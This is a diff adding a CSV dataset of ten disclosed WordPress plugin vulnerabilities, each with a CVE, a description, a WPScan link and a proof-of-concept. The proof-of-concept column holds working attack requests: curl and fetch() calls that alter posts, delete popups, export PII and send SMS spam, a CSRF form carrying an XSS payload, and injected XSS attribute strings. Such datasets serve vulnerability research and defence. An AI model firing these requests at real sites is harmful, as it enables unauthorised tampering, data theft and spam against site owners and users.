@@ -1,0 +1,99 @@
+id,plugin_name,vulnerable_version,vulnerability_name,description,cve,poc,url
+1,activedemand,< 0.2.28,Unauthenticated Post Creation/Update/Deletion,"The plugin does not have any authorisation in some of its REST route, which could allow unauthenticated users to delete, create and update arbitrary post",CVE-2022-36296,"The following curl request will create a post draft whose title is 'hacked-title':
+
+curl -X POST --url 'http://vulnerable-site.tld/wp-json/activedemand/v1/create-post?api_key=&slug=hacked-slug&title=hacked-title&content=hacked-content'",https://wpscan.com/vulnerability/d06a2db3-557b-4eae-ad80-85701cd40f3a/
+2,rsvp,< 2.7.8,Unauthenticated Entries Export,"The plugin does not have any authorisation checks when exporting its entries, and has the export function hooked to the init action. As a result, unauthenticated attackers could call it and retrieve PII such as first name, last name and email address of users registered for events",CVE-2022-1054,"curl ""https://example.com/wp-admin/admin.php?page=rsvp-admin-export""
+
+""First Name"",""Last Name"",""Email"",""RSVP Status"",""Kids Meal"",""Associated Attendees"",""Vegetarian"",""Note"",""Additional Attendee"",""pre-fill URL""
+""test"",""test"",""secret@example.com"",""Yes"",""N"","""",""N"","""",""N"",""""",https://wpscan.com/vulnerability/95a5fad1-e823-4571-8640-19bf5436578d/
+3,cp-multi-view-calendar,< 1.4.07,Unauthenticated Arbitrary Event Creation to Stored XSS,"The plugin does not have any authorisation and CSRF checks in place when creating an event, and is also lacking sanitisation as well as escaping in some of the event fields. This could allow unauthenticated attackers to create arbitrary events and put Cross-Site Scripting payloads in it.",CVE-2022-2846,"As an unauthenticated user, to add a malicious event (on October 6th, 2022) to the calendar with ID 1, open the code below
+
+<html>
+  <body>
+    <form action=""https://example.com/?cpmvc_do_action=mvparse&f=datafeed&calid=1&month_index=0&method=adddetails"" method=""POST"">
+      <input type=""hidden"" name=""Subject"" value='""><script>alert(/XSS/)</script>' />
+      <input type=""hidden"" name=""colorvalue"" value=""#f00"" />
+      <input type=""hidden"" name=""rrule"" value="""" />
+      <input type=""hidden"" name=""rruleType"" value="""" />
+      <input type=""hidden"" name=""stpartdate"" value=""10/6/2022"" />
+      <input type=""hidden"" name=""stparttime"" value=""00:00"" />
+      <input type=""hidden"" name=""etpartdate"" value=""10/6/2022"" />
+      <input type=""hidden"" name=""etparttime"" value=""00:00"" />
+      <input type=""hidden"" name=""stpartdatelast"" value=""10/6/2022"" />
+      <input type=""hidden"" name=""etpartdatelast"" value=""10/6/2022"" />
+      <input type=""hidden"" name=""stparttimelast"" value="""" />
+      <input type=""hidden"" name=""etparttimelast"" value="""" />
+      <input type=""hidden"" name=""IsAllDayEvent"" value=""1"" />
+      <input type=""hidden"" name=""Location"" value=""CSRF"" />
+      <input type=""hidden"" name=""Description"" value='<p style=""text-align: left;"">CSRF</p>' />
+      <input type=""hidden"" name=""timezone"" value=""4.5"" />
+      <input type=""submit"" value=""Submit request"" />
+    </form>
+  </body>
+</html>
+
+The XSS will be triggered when viewing the related event",https://wpscan.com/vulnerability/95f92062-08ce-478a-a2bc-6d026adf657c/
+4,popup-manager,<= 1.6.6,Unauthenticated Arbitrary Popup Deletion,"The plugin does not have authorisation and CSRF checks when deleting popups, which could allow unauthenticated users to delete them",CVE-2022-4124,"As an unauthenticated users, or via CSRF:
+
+fetch('/wp-admin/admin-ajax.php', {
+        method: 'POST',
+        headers: new Headers({
+            'Content-Type': 'application/x-www-form-urlencoded',
+        }),
+        body: 'action=pm_delete_popup&popup_id=2',
+        redirect: 'follow'
+    }).then(response => response.text()).then(result => console.log(result)).catch(error => console.log('error', error));",https://wpscan.com/vulnerability/60786bf8-c0d7-4d80-b189-866aba79bce2/
+5,smart-forms,< 2.6.71,Subscriber+ Form Data Download,"The plugin does not have authorisation in its rednao_smart_forms_entries_list AJAX action, allowing any authenticated users, such as subscriber, to download arbitrary form's data, which could include sensitive information such as PII depending on the form.",CVE-2022-0163,"Execute the below command in the web developer console of the browser when being logged in as a subscriber:
+
+fetch(""https://example.com/wp-admin/admin-ajax.php"", {
+  ""headers"": {
+    ""content-type"": ""application/x-www-form-urlencoded"",
+  },
+  ""body"": new URLSearchParams({""action"":""rednao_smart_forms_entries_list"",""data"":'{""Form"":""1""}'}),
+  ""method"": ""POST"",
+  ""credentials"": ""include""
+})
+  .then(response => response.text())
+  .then(data => console.log(data));",https://wpscan.com/vulnerability/2b6b0731-4515-498a-82bd-d416f5885268/
+6,all-in-one-wp-migration-box-extension,< 1.54,Unauthenticated Access Token Update,"The plugins do not have authorisation in the init() function hooked to the admin_init action, allowing unauthenticated attackers to update the access token",CVE-2023-40004,"With the All-in-One WP Migration Box Extension installed, open the below URL as unauthenticated:
+
+https://example.com/wp-admin/admin-ajax.php?ai1wmbe_token=AAAA",https://wpscan.com/vulnerability/637bbd1d-2bf2-470e-8d19-bd48a2280530/
+7,coming-soon,< 6.15.22,Unauthenticated Plugin Page Content Update,"The plugin does not have authorisation in its seedprod_lite_new_lpage function, allowing unauthenticated attackers to update the contents of coming-soon, maintenance pages, login and 404 pages set up with the plugin to a blank state",CVE-2024-1072,"As unauthenticated, open the following URL to put the Maintenance Mode page as blank: https://example.com/wp-admin/admin-post.php?page=seedprod_lite_template&id=0&type=mm
+
+To update other page, change the type parameter accordingly:
+- cs for Coming Soon
+- mm for Maintenance Mode
+- p404 for 404
+- loginp for Login Page",https://wpscan.com/vulnerability/19eb822d-84f3-48f2-ba1a-dbeaac64fb44/
+8,eventON,< 2.2.8,Unauthenticated Arbitrary Post Metadata Update,"The plugins do not have authorisation in an AJAX action, and does not ensure that the post to be updated belong to the plugin, allowing unauthenticated users to update arbitrary post metadata.",CVE-2024-0238,"To set the Meeting URL to https://attacker.com/ on the Virtual Event with ID 240:
+
+curl -X POST --data ""eid=240&values[_vir_url]=https://attacker.com/"" 'https://example.com/wp-admin/admin-ajax.php?action=eventon_eventpost_update_meta'
+
+To set the my_meta metadata (if it does not exist, it will be created as a custom field) to attacker on the post with ID 20:
+
+curl -X POST --data ""eid=20&values[my_meta]=attacker"" 'https://example.com/wp-admin/admin-ajax.php?action=eventon_eventpost_update_meta'
+
+This can lead to Stored XSS in Free < 2.7.7 and Premium <= 4.5.4
+
+curl -X POST --data 'eid=240&values[_evcal_ec_f1a1_cus]="" style=animation-name:rotation onanimationstart=alert(/XSS/)//' 'https://example.com/wp-admin/admin-ajax.php?action=eventon_eventpost_update_meta'
+
+The XSS will be triggered when an admin will edit the event in the backend",https://wpscan.com/vulnerability/774655ac-b201-4d9f-8790-9eff8564bc91/
+9,mstore-api,< 3.9.7,Subscriber+ Unauthorized Settings Update,"The plugin does not secure most of its AJAX actions by implementing privilege checks, nonce checks, or a combination of both.",CVE-2023-3131,"Make sure the site also has WooCommerce installed and activated, then, while logged-in as a subscriber, visit the following URLs:
+
+- http://TARGET-SERVER/wp-admin/admin-ajax.php?action=mstore_update_limit_product&limit=99
+- http://TARGET-SERVER/wp-admin/admin-ajax.php?action=mstore_update_firebase_server_key&serverKey=hacked
+- http://TARGET-SERVER/wp-admin/admin-ajax.php?action=mstore_update_new_order_title&title=1337
+- http://TARGET-SERVER/wp-admin/admin-ajax.php?action=mstore_update_new_order_message&message=hacked+message
+- http://TARGET-SERVER/wp-admin/admin-ajax.php?action=mstore_update_status_order_title&title=1338
+- http://TARGET-SERVER/wp-admin/admin-ajax.php?action=mstore_update_status_order_message&message=hacked+message
+
+Then, while logged-in as an administrator, visit /wp-admin/admin.php?page=mstore-plugin, and notice how the attacks have changed all the values.",https://wpscan.com/vulnerability/970735f1-24bb-441c-89b6-5a0959246d6c/
+10,donation-button,<= 4.0.0,Subscriber+ Broken Access Control leading to SMS Spam,"The plugin does not properly check for privileges and nonce tokens in its ""donation_button_twilio_send_test_sms"" AJAX action, which may allow any users with an account on the affected site, like subscribers, to use the plugin's Twilio integration to send SMSes to arbitrary phone numbers.",CVE-2022-4004,"While logged onto the site as a subscriber, paste the following in your browser's console:
+
+fetch('http://localhost/wp-admin/admin-ajax.php', {
+        method: 'POST',
+        headers: new Headers({
+            'Content-Type': 'application/x-www-form-urlencoded',
+        }),
+        body: 'action=donation_button_twilio_send_test_sms&donation_button_twilio_sms_test_mobile_number=+36205551122&donation_button_twilio_sms_test_message=TEXT'
+    }).then(response => response.text()).then(result => console.log(result)).catch(error => console.log('error', error));",https://wpscan.com/vulnerability/6a3bcfb3-3ede-459d-969f-b7b30dafd098/
